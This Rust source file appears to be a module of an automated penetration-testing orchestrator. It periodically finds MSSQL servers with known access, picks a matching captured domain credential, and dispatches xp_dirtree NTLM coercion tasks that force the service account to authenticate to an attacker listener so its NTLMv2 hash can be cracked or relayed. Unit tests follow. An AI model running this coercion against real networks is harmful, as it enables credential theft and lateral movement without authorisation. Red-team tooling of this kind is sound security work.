//! auto_mssql_coercion -- coerce NTLM authentication from MSSQL servers via
//! xp_dirtree/xp_fileexist.
//!
//! When we have MSSQL access (discovered by `auto_mssql_detection`) and a
//! listener IP, we can force the SQL Server service account to authenticate
//! back to our listener, capturing its NTLMv2 hash for cracking or relay.
//!
//! This is distinct from the general `auto_coercion` module which uses
//! PetitPotam/PrinterBug against DCs.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Monitors for MSSQL servers and dispatches xp_dirtree NTLM coercion.
/// Interval: 45s.
pub async fn auto_mssql_coercion(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("mssql_coercion") {
            continue;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue,
        };

        let work: Vec<MssqlCoercionWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            let mut items = Vec::new();

            // Target MSSQL hosts (identified by mssql_access vuln or host services)
            for vuln in state.discovered_vulnerabilities.values() {
                if vuln.vuln_type.to_lowercase() != "mssql_access" {
                    continue;
                }

                let target_ip = vuln
                    .details
                    .get("target_ip")
                    .and_then(|v| v.as_str())
                    .unwrap_or(&vuln.target);

                if target_ip.is_empty() {
                    continue;
                }

                let dedup_key = format!("mssql_coerce:{target_ip}");
                if state.is_processed(DEDUP_MSSQL_COERCION, &dedup_key) {
                    continue;
                }

                let domain = vuln
                    .details
                    .get("domain")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string();

                let cred = state
                    .credentials
                    .iter()
                    .find(|c| {
                        !domain.is_empty() && c.domain.to_lowercase() == domain.to_lowercase()
                    })
                    .or_else(|| state.credentials.first())
                    .cloned();

                let cred = match cred {
                    Some(c) => c,
                    None => continue,
                };

                items.push(MssqlCoercionWork {
                    dedup_key,
                    target_ip: target_ip.to_string(),
                    listener: listener.clone(),
                    credential: cred,
                });
            }

            items
        };

        for item in work {
            let payload = json!({
                "technique": "mssql_ntlm_coercion",
                "target_ip": item.target_ip,
                "listener_ip": item.listener,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("mssql_coercion");
            match dispatcher
                .throttled_submit("coercion", "coercion", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        target = %item.target_ip,
                        "MSSQL xp_dirtree NTLM coercion dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_MSSQL_COERCION, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_MSSQL_COERCION, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(target = %item.target_ip, "MSSQL coercion task deferred");
                }
                Err(e) => {
                    warn!(err = %e, target = %item.target_ip, "Failed to dispatch MSSQL coercion");
                }
            }
        }
    }
}

struct MssqlCoercionWork {
    dedup_key: String,
    target_ip: String,
    listener: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("mssql_coerce:{}", "192.168.58.22");
        assert_eq!(key, "mssql_coerce:192.168.58.22");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_MSSQL_COERCION, "mssql_coercion");
    }

    #[test]
    fn mssql_access_vuln_type_matching() {
        assert_eq!("mssql_access".to_lowercase(), "mssql_access");
        assert_ne!("smb_signing_disabled".to_lowercase(), "mssql_access");
    }

    #[test]
    fn target_ip_from_vuln_details() {
        let details = serde_json::json!({"target_ip": "192.168.58.22"});
        let target = details
            .get("target_ip")
            .and_then(|v| v.as_str())
            .unwrap_or("fallback");
        assert_eq!(target, "192.168.58.22");
    }

    #[test]
    fn target_ip_fallback_to_vuln_target() {
        let details = serde_json::json!({});
        let fallback = "192.168.58.10";
        let target = details
            .get("target_ip")
            .and_then(|v| v.as_str())
            .unwrap_or(fallback);
        assert_eq!(target, "192.168.58.10");
    }
}
